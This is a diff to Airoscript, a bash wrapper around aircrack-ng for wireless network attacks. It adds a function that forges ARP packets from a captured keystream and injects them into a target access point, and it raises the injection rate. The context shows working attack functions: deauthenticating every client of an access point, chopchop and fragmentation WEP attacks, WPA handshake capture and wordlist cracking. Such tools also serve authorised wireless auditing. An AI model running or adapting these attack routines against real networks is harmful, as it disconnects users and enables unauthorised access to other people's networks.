@@ -3,8 +3,8 @@
 # Program:	Airoscript                                                          
 # Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
 # Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes and darkAudax
-# Date:	        21.01.2007
-# Version:	BETA-1 2.0.7 TESTING RELEASE FOR AIRCRACK-NG 0.7
+# Date:	        17.02.2007
+# Version:	SVN 2.0.7 TESTING RELEASE FOR AIRCRACK-NG 0.7
 # 
 # Dependencies: aircrack-ng,xterm,grep,awk,drivers capable of injection
 #
@@ -18,15 +18,17 @@
 #                                                                                           
 # Notes:  Important  ===>>>  Set variable DEBUG to 1 to enable debugging of errors  <<<===
 #
-CARDCTL="pccardctl"
+
 #CardCtl executable (on 2.4 kernels, it is cardctl)
+CARDCTL="pccardctl"
+#
 WELCOME="0"
 DEBUG="0"
 #This is the interface you want to use to perform the attack
 #If you dont set this, airoscript will ask you for interface to use
 WIFI=""
 #This is the rate per second at wich packets will be injected
-INJECTRATE="300"
+INJECTRATE="370"
 #How many times the deauth attack is run
 DEAUTHTIME="5"
 #Time between re-association with target AP
@@ -325,6 +327,7 @@ while true; do
   echo "9) Chopchop attack injection part of the attack"
   echo "10) Chopchop attack using a client injection part of the attack"
   echo "11) Fragmentation attack - Injection part"
+  echo "12) ARP packet generation and injection from a xor"
   read yn
   echo ""
   case $yn in
@@ -339,6 +342,7 @@ while true; do
     9 ) chopchopend ; break ;;
    10 ) chopchopclientend ; break ;;
    11 ) fragmentationattackend ; break ;;
+   12 ) pskarp ; break ;;
     * ) echo "unknown response. Try again" ;;
   esac
 done 
@@ -461,6 +465,10 @@ HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| 
 function cleanup {
 	killall -9 aireplay-ng airodump-ng > /dev/null &
 	ifconfig $WIFI down
+	#pccardctl eject
+	clear
+        sleep 2
+	#pccardctl insert
 	$CARDCTL eject
 	sleep 2
 	$CARDCTL insert
@@ -598,7 +606,7 @@ function crack   {
 function wpahandshake {
 	clear
 	rm -rf $DUMP_PATH/$Host_MAC*
-	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN $WIFI & menufonction
+	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
 }
 function wpacrack {
 xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST
@@ -606,7 +614,7 @@ xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 2 -
 function Scan {
 	clear
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT $WIFI
+	xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
 }
 # This scan for targets on a specific channel
 function Scanchan {
@@ -616,12 +624,12 @@ echo You typed: $channel_number
 set -- ${channel_number}
 	clear
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT $WIFI
+	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
 }
 function capture {
 	clear
 	rm -rf $DUMP_PATH/$Host_MAC*
-	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN $WIFI
+	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
 }
 function deauthall {
 	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
@@ -713,6 +721,13 @@ function fragmentationattackend {
 $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
 }
+
+function pskarp {
+rm -rf $DUMP_PATH/arp_*.cap
+	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k 255.255.255.255 -l 255.255.255.255 -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
+	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap $WIFI & menufonction
+}
+
 
 function menufonction {
 xterm $HOLD $TOPRIGHT -title "Fake function to jump to menu" -e echo "Aircrack-ng is a great tool, Mister_X ASPj HIRTE are GODS"
